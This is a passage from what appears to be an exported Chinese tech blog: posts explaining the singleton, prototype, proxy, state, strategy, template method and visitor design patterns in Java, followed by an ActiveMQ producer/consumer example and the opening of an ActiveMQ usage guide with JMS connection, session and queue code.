        if (instance == null) &#123;
            instance = new SingletonTest();
        &#125;
    &#125;

    public static SingletonTest getInstance() &#123;
        if (instance == null) &#123;
            syncInit();
        &#125;
        return instance;
    &#125;
&#125;
</code></pre>
<p>考虑性能的话，整个程序只需创建一次实例，所以性能也不会有什么影响。</p>
<p>通过单例模式的学习告诉我们：</p>
<p>1、单例模式理解起来简单，但是具体实现起来还是有一定的难度。</p>
<p>2、synchronized关键字锁定的是对象，在用的时候，一定要在恰当的地方使用（注意需要使用锁的对象和过程，可能有的时候并不是整个对象及整个过程都需要锁）。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>原型模式（Prototype）</title>
    <url>/blog/arch/dp/prototype/</url>
    <content><![CDATA[<p>原型模式虽然是创建型的模式，但是与工程模式没有关系，从名字即可看出，该模式的思想就是将一个对象作为原型，对其进行复制、克隆，产生一个和原对象类似的新对象。本小结会通过对象的复制，进行讲解。在Java中，复制对象是通过clone()实现的，先创建一个原型类：</p>
<pre><code>public class Prototype implements Cloneable &#123;

    public Object clone() throws CloneNotSupportedException &#123;
        Prototype proto = (Prototype) super.clone();
        return proto;
    &#125;
&#125;
</code></pre>
<p>很简单，一个原型类，只需要实现Cloneable接口，覆写clone方法，此处clone方法可以改成任意的名称，因为Cloneable接口是个空接口，你可以任意定义实现类的方法名，如cloneA或者cloneB，因为此处的重点是super.clone()这句话，super.clone()调用的是Object的clone()方法，而在Object类中，clone()是native的，具体怎么实现，我会在另一篇文章中，关于解读Java中本地方法的调用，此处不再深究。在这儿，我将结合对象的浅复制和深复制来说一下，首先需要了解对象深、浅复制的概念：</p>
<p>浅复制：将一个对象复制后，基本数据类型的变量都会重新创建，而引用类型，指向的还是原对象所指向的。</p>
<p>深复制：将一个对象复制后，不论是基本数据类型还有引用类型，都是重新创建的。简单来说，就是深复制进行了完全彻底的复制，而浅复制不彻底。</p>
<p>此处，写一个深浅复制的例子：</p>
<pre><code>public class Prototype implements Cloneable, Serializable &#123;

    private static final long serialVersionUID = 1L;
    private String string;

    private SerializableObject obj;

    /* 浅复制 */
    public Object clone() throws CloneNotSupportedException &#123;
        Prototype proto = (Prototype) super.clone();
        return proto;
    &#125;

    /* 深复制 */
    public Object deepClone() throws IOException, ClassNotFoundException &#123;

        /* 写入当前对象的二进制流 */
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(this);

        /* 读出二进制流产生的新对象 */
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bis);
        return ois.readObject();
    &#125;

    public String getString() &#123;
        return string;
    &#125;

    public void setString(String string) &#123;
        this.string = string;
    &#125;

    public SerializableObject getObj() &#123;
        return obj;
    &#125;

    public void setObj(SerializableObject obj) &#123;
        this.obj = obj;
    &#125;

&#125;

class SerializableObject implements Serializable &#123;
    private static final long serialVersionUID = 1L;
&#125;
</code></pre>
<p>要实现深复制，需要采用流的形式读入当前对象的二进制输入，再写出二进制数据对应的对象。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>代理模式（Proxy）</title>
    <url>/blog/arch/dp/proxy/</url>
    <content><![CDATA[<p>其实每个模式名称就表明了该模式的作用，代理模式就是多一个代理类出来，替原对象进行一些操作，比如我们在租房子的时候回去找中介，为什么呢？因为你对该地区房屋的信息掌握的不够全面，希望找一个更熟悉的人去帮你做，此处的代理就是这个意思。再如我们有的时候打官司，我们需要请律师，因为律师在法律方面有专长，可以替我们进行操作，表达我们的想法。先来看看关系图：</p>
<p><img src="/images/design/dpproxy.png"></p>
<p>根据上文的阐述，代理模式就比较容易的理解了，我们看下代码：</p>
<pre><code>public interface Sourceable &#123;
    public void method();
&#125;

public class Source implements Sourceable &#123;

    @Override
    public void method() &#123;
        System.out.println(&quot;the original method!&quot;);
    &#125;
&#125;

public class Proxy implements Sourceable &#123;

    private Source source;
    public Proxy()&#123;
        super();
        this.source = new Source();
    &#125;
    @Override
    public void method() &#123;
        before();
        source.method();
        atfer();
    &#125;
    private void atfer() &#123;
        System.out.println(&quot;after proxy!&quot;);
    &#125;
    private void before() &#123;
        System.out.println(&quot;before proxy!&quot;);
    &#125;
&#125;

public class ProxyTest &#123;

    public static void main(String[] args) &#123;
        Sourceable source = new Proxy();
        source.method();
    &#125;

&#125;
</code></pre>
<p>代理模式的应用场景：</p>
<p>如果已有的方法在使用的时候需要对原有的方法进行改进，此时有两种办法：</p>
<p>1、修改原有的方法来适应。这样违反了“对扩展开放，对修改关闭”的原则。</p>
<p>2、就是采用一个代理类调用原有的方法，且对产生的结果进行控制。这种方法就是代理模式。</p>
<p>使用代理模式，可以将功能划分的更加清晰，有助于后期维护！</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>状态模式（State）</title>
    <url>/blog/arch/dp/state/</url>
    <content><![CDATA[<p>核心思想就是：当对象的状态改变时，同时改变其行为，很好理解！就拿QQ来说，有几种状态，在线、隐身、忙碌等，每个状态对应不同的操作，而且你的好友也能看到你的状态，所以，状态模式就两点：</p>
<p>1、可以通过改变状态来获得不同的行为。<br>2、你的好友能同时看到你的变化。看图：</p>
<p><img src="/images/design/dpstate.png"></p>
<p>State类是个状态类，Context类可以实现切换，我们来看看代码：</p>
<pre><code>public class State &#123;
    
    private String value;
    
    public String getValue() &#123;
        return value;
    &#125;

    public void setValue(String value) &#123;
        this.value = value;
    &#125;

    public void method1()&#123;
        System.out.println(&quot;execute the first opt!&quot;);
    &#125;
    
    public void method2()&#123;
        System.out.println(&quot;execute the second opt!&quot;);
    &#125;
&#125;

public class Context &#123;

    private State state;

    public Context(State state) &#123;
        this.state = state;
    &#125;

    public State getState() &#123;
        return state;
    &#125;

    public void setState(State state) &#123;
        this.state = state;
    &#125;

    public void method() &#123;
        if (state.getValue().equals(&quot;state1&quot;)) &#123;
            state.method1();
        &#125; else if (state.getValue().equals(&quot;state2&quot;)) &#123;
            state.method2();
        &#125;
    &#125;
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;
        
        State state = new State();
        Context context = new Context(state);
        
        //设置第一种状态
        state.setValue(&quot;state1&quot;);
        context.method();
        
        //设置第二种状态
        state.setValue(&quot;state2&quot;);
        context.method();
    &#125;
&#125;
</code></pre>
<p>输出：</p>
<pre><code>execute the first opt!
execute the second opt!
</code></pre>
<p>根据这个特性，状态模式在日常开发中用的挺多的，尤其是做网站的时候，我们有时希望根据对象的某一属性，区别开他们的一些功能，比如说简单的权限控制等。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>策略模式（strategy）</title>
    <url>/blog/arch/dp/stategy/</url>
    <content><![CDATA[<p>策略模式定义了一系列算法，并将每个算法封装起来，使他们可以相互替换，且算法的变化不会影响到使用算法的客户。需要设计一个接口，为一系列实现类提供统一的方法，多个实现类实现该接口，设计一个抽象类（可有可无，属于辅助类），提供辅助函数，关系图如下：</p>
<p><img src="/images/design/dpstrategy.png"></p>
<p>图中ICalculator提供同意的方法，AbstractCalculator是辅助类，提供辅助方法，接下来，依次实现下每个类：</p>
<pre><code>public interface ICalculator &#123;
    public int calculate(String exp);
&#125;

public abstract class AbstractCalculator &#123;
    
    public int[] split(String exp,String opt)&#123;
        String array[] = exp.split(opt);
        int arrayInt[] = new int[2];
        arrayInt[0] = Integer.parseInt(array[0]);
        arrayInt[1] = Integer.parseInt(array[1]);
        return arrayInt;
    &#125;
&#125;

public class Plus extends AbstractCalculator implements ICalculator &#123;

    @Override
    public int calculate(String exp) &#123;
        int arrayInt[] = split(exp,&quot;\\+&quot;);
        return arrayInt[0]+arrayInt[1];
    &#125;
&#125;

public class Minus extends AbstractCalculator implements ICalculator &#123;

    @Override
    public int calculate(String exp) &#123;
        int arrayInt[] = split(exp,&quot;-&quot;);
        return arrayInt[0]-arrayInt[1];
    &#125;

&#125;

public class Multiply extends AbstractCalculator implements ICalculator &#123;

    @Override
    public int calculate(String exp) &#123;
        int arrayInt[] = split(exp,&quot;\\*&quot;);
        return arrayInt[0]*arrayInt[1];
    &#125;
&#125;

public class StrategyTest &#123;

    public static void main(String[] args) &#123;
        String exp = &quot;2+8&quot;;
        ICalculator cal = new Plus();
        int result = cal.calculate(exp);
        System.out.println(result);
    &#125;
&#125;
</code></pre>
<p>策略模式的决定权在用户，系统本身提供不同算法的实现，新增或者删除算法，对各种算法做封装。因此，策略模式多用在算法决策系统中，外部用户只需要决定用哪个算法即可。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>模板方法模式（Template Method）</title>
    <url>/blog/arch/dp/template/</url>
    <content><![CDATA[<p>解释一下模板方法模式，就是指：一个抽象类中，有一个主方法，再定义1…n个方法，可以是抽象的，也可以是实际的方法，定义一个类，继承该抽象类，重写抽象方法，通过调用抽象类，实现对子类的调用，先看个关系图：</p>
<p><img src="/images/design/dptemplate.png"></p>
<p>就是在AbstractCalculator类中定义一个主方法calculate，calculate()调用spilt()等，Plus和Minus分别继承AbstractCalculator类，通过对AbstractCalculator的调用实现对子类的调用，看下面的例子：</p>
<pre><code>public abstract class AbstractCalculator &#123;
    
    /*主方法，实现对本类其它方法的调用*/
    public final int calculate(String exp,String opt)&#123;
        int array[] = split(exp,opt);
        return calculate(array[0],array[1]);
    &#125;
    
    /*被子类重写的方法*/
    abstract public int calculate(int num1,int num2);
    
    public int[] split(String exp,String opt)&#123;
        String array[] = exp.split(opt);
        int arrayInt[] = new int[2];
        arrayInt[0] = Integer.parseInt(array[0]);
        arrayInt[1] = Integer.parseInt(array[1]);
        return arrayInt;
    &#125;
&#125;

public class Plus extends AbstractCalculator &#123;

    @Override
    public int calculate(int num1,int num2) &#123;
        return num1 + num2;
    &#125;
&#125;

public class StrategyTest &#123;

    public static void main(String[] args) &#123;
        String exp = &quot;8+8&quot;;
        AbstractCalculator cal = new Plus();
        int result = cal.calculate(exp, &quot;\\+&quot;);
        System.out.println(result);
    &#125;
&#125;
</code></pre>
<p>我跟踪下这个小程序的执行过程：首先将exp和”\\+”做参数，调用AbstractCalculator类里的calculate(String,String)方法，在calculate(String,String)里调用同类的split()，之后再调用calculate(int,int)方法，从这个方法进入到子类中，执行完return num1 +num2后，将值返回到AbstractCalculator类，赋给result，打印出来。正好验证了我们开头的思路。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>访问者模式（Visitor）</title>
    <url>/blog/arch/dp/visitor/</url>
    <content><![CDATA[<p>访问者模式把数据结构和作用于结构上的操作解耦合，使得操作集合可相对自由地演化。访问者模式适用于数据结构相对稳定算法又易变化的系统。因为访问者模式使得算法操作增加变得容易。若系统数据结构对象易于变化，经常有新的数据对象增加进来，则不适合使用访问者模式。访问者模式的优点是增加操作很容易，因为增加操作意味着增加新的访问者。访问者模式将有关行为集中到一个访问者对象中，其改变不影响系统数据结构。其缺点就是增加新的数据结构很困难。</p>
<p>简单来说，访问者模式就是一种分离对象数据结构与行为的方法，通过这种分离，可达到为一个被访问者动态添加新的操作而无需做其它的修改的效果。简单关系图：</p>
<p><img src="/images/design/dpvisitor.png"></p>
<p>来看看原码：</p>
<pre><code>public interface Visitor &#123;
    public void visit(Subject sub);
&#125;

public class MyVisitor implements Visitor &#123;

    @Override
    public void visit(Subject sub) &#123;
        System.out.println(&quot;visit the subject：&quot;+sub.getSubject());
    &#125;
&#125;

public interface Subject &#123;
    public void accept(Visitor visitor);
    public String getSubject();
&#125;

public class MySubject implements Subject &#123;

    @Override
    public void accept(Visitor visitor) &#123;
        visitor.visit(this);
    &#125;

    @Override
    public String getSubject() &#123;
        return &quot;love&quot;;
    &#125;
&#125;

public class Test &#123;

    public static void main(String[] args) &#123;
        
        Visitor visitor = new MyVisitor();
        Subject sub = new MySubject();
        sub.accept(visitor);    
    &#125;
&#125;
</code></pre>
<p>输出：visit the subject：love</p>
<p>该模式适用场景：如果我们想为一个现有的类增加新功能，不得不考虑几个事情：1、新功能会不会与现有功能出现兼容性问题？2、以后会不会再需要添加？3、如果类不允许修改代码怎么办？面对这些问题，最好的解决方法就是使用访问者模式，访问者模式适用于数据结构相对稳定的系统，把数据结构和算法解耦</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>【JMS】ActiveMQ示例</title>
    <url>/blog/arch/jms/activemqdemo/</url>
    <content><![CDATA[<h3 id="ActiveMQ安装"><a href="#ActiveMQ安装" class="headerlink" title="ActiveMQ安装"></a>ActiveMQ安装</h3><p>到官网<a href="http://activemq.apache.org下载安装包./">http://activemq.apache.org下载安装包。</a></p>
<p>解压到指定目录，window启动用<code>bin\activemq start</code>,linux用<code>./activemq start</code>。</p>
<h3 id="示例看点"><a href="#示例看点" class="headerlink" title="示例看点"></a>示例看点</h3><p>在网上找了个示例测试了一下，示例还是有点看点的。</p>
<p>多线程的使用、ThreadLocal的使用、AtomicInteger的使用。</p>
<p>运行时还发现一个问题，当producter运行时运行comsumer每个线程都可以消息消息，但停了producter后再运行comsumer只有一个会消费消息。</p>
<h3 id="Producter"><a href="#Producter" class="headerlink" title="Producter"></a>Producter</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.iteedu.test.activemq;</span><br><span class="line"></span><br><span class="line">import java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line">import javax.jms.Connection;</span><br><span class="line">import javax.jms.ConnectionFactory;</span><br><span class="line">import javax.jms.JMSException;</span><br><span class="line">import javax.jms.MessageProducer;</span><br><span class="line">import javax.jms.Queue;</span><br><span class="line">import javax.jms.Session;</span><br><span class="line">import javax.jms.TextMessage;</span><br><span class="line"></span><br><span class="line">import org.apache.activemq.ActiveMQConnection;</span><br><span class="line">import org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line">public class Producter &#123;</span><br><span class="line"></span><br><span class="line">    //ActiveMq 的默认用户名</span><br><span class="line">    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;</span><br><span class="line">    //ActiveMq 的默认登录密码</span><br><span class="line">    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;</span><br><span class="line">    //ActiveMQ 的链接地址</span><br><span class="line">    private static final String BROKEN_URL = ActiveMQConnection.DEFAULT_BROKER_URL;</span><br><span class="line"></span><br><span class="line">    AtomicInteger count = new AtomicInteger(0);</span><br><span class="line">    //链接工厂</span><br><span class="line">    ConnectionFactory connectionFactory;</span><br><span class="line">    //链接对象</span><br><span class="line">    Connection connection;</span><br><span class="line">    //事务管理</span><br><span class="line">    Session session;</span><br><span class="line">    ThreadLocal&lt;MessageProducer&gt; threadLocal = new ThreadLocal&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    public void init()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //创建一个链接工厂</span><br><span class="line">            connectionFactory = new ActiveMQConnectionFactory(USERNAME,PASSWORD,BROKEN_URL);</span><br><span class="line">            //从工厂中创建一个链接</span><br><span class="line">            connection  = connectionFactory.createConnection();</span><br><span class="line">            //开启链接</span><br><span class="line">            connection.start();</span><br><span class="line">            //创建一个事务（这里通过参数可以设置事务的级别）</span><br><span class="line">            session = connection.createSession(true,Session.SESSION_TRANSACTED);</span><br><span class="line">        &#125; catch (JMSException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sendMessage(String disname)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //创建一个消息队列</span><br><span class="line">            Queue queue = session.createQueue(disname);</span><br><span class="line">            //消息生产者</span><br><span class="line">            MessageProducer messageProducer = null;</span><br><span class="line">            if(threadLocal.get()!=null)&#123;</span><br><span class="line">                messageProducer = threadLocal.get();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                messageProducer = session.createProducer(queue);</span><br><span class="line">                threadLocal.set(messageProducer);</span><br><span class="line">            &#125;</span><br><span class="line">           while(true)&#123;</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">                int num = count.getAndIncrement();</span><br><span class="line">                //创建一条消息</span><br><span class="line">                TextMessage msg = session.createTextMessage(Thread.currentThread().getName()+</span><br><span class="line">                        &quot;productor:this is a message,count:&quot;+num);</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+</span><br><span class="line">                        &quot;productor:this is a message,count:&quot;+num);</span><br><span class="line">                //发送消息</span><br><span class="line">                messageProducer.send(msg);</span><br><span class="line">                //提交事务</span><br><span class="line">                session.commit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (JMSException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TestProducter"><a href="#TestProducter" class="headerlink" title="TestProducter"></a>TestProducter</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.iteedu.test.activemq;</span><br><span class="line"></span><br><span class="line">public class TestProducter &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Producter producter = new Producter();</span><br><span class="line">        producter.init();</span><br><span class="line">        TestProducter testMq = new TestProducter();</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(1000);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        //Thread 1</span><br><span class="line">        new Thread(testMq.new ProductorMq(producter)).start();</span><br><span class="line">        //Thread 2</span><br><span class="line">        new Thread(testMq.new ProductorMq(producter)).start();</span><br><span class="line">        //Thread 3</span><br><span class="line">        new Thread(testMq.new ProductorMq(producter)).start();</span><br><span class="line">        //Thread 4</span><br><span class="line">        new Thread(testMq.new ProductorMq(producter)).start();</span><br><span class="line">        //Thread 5</span><br><span class="line">        new Thread(testMq.new ProductorMq(producter)).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private class ProductorMq implements Runnable&#123;</span><br><span class="line">        Producter producter;</span><br><span class="line">        public ProductorMq(Producter producter)&#123;</span><br><span class="line">            this.producter = producter;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            while(true)&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    producter.sendMessage(&quot;com.iteedu&quot;);</span><br><span class="line">                    Thread.sleep(10000);</span><br><span class="line">                &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Comsumer"><a href="#Comsumer" class="headerlink" title="Comsumer"></a>Comsumer</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.iteedu.test.activemq;</span><br><span class="line"></span><br><span class="line">import java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line">import javax.jms.Connection;</span><br><span class="line">import javax.jms.ConnectionFactory;</span><br><span class="line">import javax.jms.JMSException;</span><br><span class="line">import javax.jms.MessageConsumer;</span><br><span class="line">import javax.jms.Queue;</span><br><span class="line">import javax.jms.Session;</span><br><span class="line">import javax.jms.TextMessage;</span><br><span class="line"></span><br><span class="line">import org.apache.activemq.ActiveMQConnection;</span><br><span class="line">import org.apache.activemq.ActiveMQConnectionFactory;</span><br><span class="line"></span><br><span class="line">public class Comsumer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;</span><br><span class="line"></span><br><span class="line">    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;</span><br><span class="line"></span><br><span class="line">    private static final String BROKEN_URL = ActiveMQConnection.DEFAULT_BROKER_URL;</span><br><span class="line"></span><br><span class="line">    ConnectionFactory connectionFactory;</span><br><span class="line"></span><br><span class="line">    Connection connection;</span><br><span class="line"></span><br><span class="line">    Session session;</span><br><span class="line"></span><br><span class="line">    ThreadLocal&lt;MessageConsumer&gt; threadLocal = new ThreadLocal&lt;&gt;();</span><br><span class="line">    AtomicInteger count = new AtomicInteger();</span><br><span class="line"></span><br><span class="line">    public void init()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            connectionFactory = new ActiveMQConnectionFactory(USERNAME,PASSWORD,BROKEN_URL);</span><br><span class="line">            connection  = connectionFactory.createConnection();</span><br><span class="line">            connection.start();</span><br><span class="line">            session = connection.createSession(false,Session.AUTO_ACKNOWLEDGE);</span><br><span class="line">        &#125; catch (JMSException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void getMessage(String disname)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Queue queue = session.createQueue(disname);</span><br><span class="line">            MessageConsumer consumer = null;</span><br><span class="line"></span><br><span class="line">            if(threadLocal.get()!=null)&#123;</span><br><span class="line">                consumer = threadLocal.get();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                consumer = session.createConsumer(queue);</span><br><span class="line">                threadLocal.set(consumer);</span><br><span class="line">            &#125;</span><br><span class="line">            while(true)&#123;</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">                TextMessage msg = (TextMessage) consumer.receive();</span><br><span class="line">                if(msg!=null) &#123;</span><br><span class="line">                    msg.acknowledge();</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+&quot;: Consumer:我是消费者，我正在消费Msg&quot;+msg.getText()+&quot;---&gt;&quot;+count.getAndIncrement());</span><br><span class="line">                &#125;else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (JMSException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="TestConsumer"><a href="#TestConsumer" class="headerlink" title="TestConsumer"></a>TestConsumer</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.iteedu.test.activemq;</span><br><span class="line"></span><br><span class="line">public class TestConsumer &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Comsumer comsumer = new Comsumer();</span><br><span class="line">        comsumer.init();</span><br><span class="line">        TestConsumer testConsumer = new TestConsumer();</span><br><span class="line">        new Thread(testConsumer.new ConsumerMq(comsumer)).start();</span><br><span class="line">        new Thread(testConsumer.new ConsumerMq(comsumer)).start();</span><br><span class="line">        new Thread(testConsumer.new ConsumerMq(comsumer)).start();</span><br><span class="line">        new Thread(testConsumer.new ConsumerMq(comsumer)).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private class ConsumerMq implements Runnable&#123;</span><br><span class="line">        Comsumer comsumer;</span><br><span class="line">        public ConsumerMq(Comsumer comsumer)&#123;</span><br><span class="line">            this.comsumer = comsumer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            while(true)&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    comsumer.getMessage(&quot;com.iteedu&quot;);</span><br><span class="line">                    Thread.sleep(10000);</span><br><span class="line">                &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>消息队列</category>
        <category>JMS</category>
      </categories>
      <tags>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>【JMS】ActiveMQ使用指南</title>
    <url>/blog/arch/jms/activemq/</url>
    <content><![CDATA[<h3 id="ActiveMQ"><a href="#ActiveMQ" class="headerlink" title="ActiveMQ"></a>ActiveMQ</h3><p>ActiveMQ是JMS的一种实现，是比较流行的一款，特性及优势：</p>
<p>1、实现 JMS1.1 规范，支持 J2EE1.4以上<br>2、可运行于任何 jvm和大部分 web 容器（ActiveMQ works great in any JVM）<br>3、支持多种语言客户端（java, C, C++, AJAX, ACTIONSCRIPT 等等）<br>4、支持多种协议（stomp，openwire，REST）<br>5、良好的 spring 支持（ActiveMQ has great Spring Support）<br>6、速度很快，JBossMQ的十倍（ActiveMQ is very fast; often 10x faster than JBossMQ.）<br>7、与 OpenJMS、JbossMQ等开源jms provider 相比，ActiveMQ有 Apache 的支<br>持，持续发展的优势明显。</p>
<h3 id="编程模板"><a href="#编程模板" class="headerlink" title="编程模板"></a>编程模板</h3><p>要初始化 JMS，则需要使用连接工厂。客户端通过创建ConnectionFactory 建立到<br>ActveMQ 的连接。</p>
<h4 id="ActiveMQConnectionFactory"><a href="#ActiveMQConnectionFactory" class="headerlink" title="ActiveMQConnectionFactory"></a>ActiveMQConnectionFactory</h4><p>构造方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ActiveMQConnectionFactory();</span><br><span class="line">ActiveMQConnectionFactory(String brokerURL);</span><br><span class="line">ActiveMQConnectionFactory(String userName, String password, String brokerURL) ;</span><br><span class="line">ActiveMQConnectionFactory(String userName, String password, URI brokerURL) ;</span><br><span class="line">ActiveMQConnectionFactory(URI brokerURL);</span><br></pre></td></tr></table></figure>
<p>其中 brokerURL 为 ActiveMQ 服务地址和端口。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(&quot;tcp://192.168.0.135:61616&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h4><p>在成功创建正确的 ConnectionFactory后，下一步将是创建一个连接，它是 JMS 定<br>义的一个接口。</p>
<p>ConnectionFactory负责返回可以与底层消息传递系统进行通信的 Connection 实现。通常客户端只使用单一连接。根据JMS 文档，Connection的目的是“利用 JMS 提供者封装开放的连接”，以及表示“客户端与提供者服务例程之间的开放TCP&#x2F;IP 套接字”。</p>
<p>该文档还指出 Connection 应该是进行客户端身份验证的地方，除了其他一些事项外，客户端还可以指定惟一标志符。</p>
<p>当一个 Connection 被创建时， 它的传输默认是关闭的， 必须使用 start 方法开启。</p>
<p>一个 Connection 可以建立一个或多个的Session。</p>
<p>当一个程序执行完成后，必须关闭之前创建的Connection，否则ActiveMQ不能释放资源，关闭一个Connection 同样也关闭了Session，MessageProducer 和MessageConsumer。</p>
<p>Connection 支持并发。</p>
<p>ActiveMQConnectionFactory 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection createConnection()；</span><br><span class="line">Connection createConnection(String userName, String password);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection connection = connectionFactory.createConnection();</span><br><span class="line">connection.start();</span><br></pre></td></tr></table></figure>

<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>一旦从 ConnectionFactory 中获得一个Connection，就必须从 Connection中创建一个或者多个 Session。Session 是一个发送或接收消息的线程，可以使用Session创建 MessageProducer，MessageConsumer和 Message。</p>
<p>Session 可以被事务化，也可以不被事务化，通常，可以通过向 Connection 上的适<br>当创建方法传递一个布尔参数对此进行设置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session createSession(boolean transacted, int acknowledgeMode);</span><br></pre></td></tr></table></figure>
<p>其中 transacted 为使用事务标识，acknowledgeMode 为签收模式。<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session session = connection.createSession(false,Session.AUTO_ACKNOWLEDGE); </span><br></pre></td></tr></table></figure>

<h4 id="Destination"><a href="#Destination" class="headerlink" title="Destination"></a>Destination</h4><p>Destination 是一个客户端用来指定生产消息目标和消费消息来源的对象。</p>
<p>在 PTP 模式中，Destination 被称作Queue 即队列；在 Pub&#x2F;Sub 模式，Destinatio<br>n 被称作 Topic 即主题。在程序中可以使用多个Queue 和 Topic。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Queue createQueue(String queueName);</span><br><span class="line">TemporaryQueue createTemporaryQueue();</span><br><span class="line">Topic createTopic(String topicName);</span><br><span class="line">TemporaryTopic createTemporaryTopic();</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Destination destination = session.createQueue(&quot;TEST.FOO&quot;);</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Destination destination = session.createTopic(&quot;TEST.FOO&quot;);</span><br></pre></td></tr></table></figure>
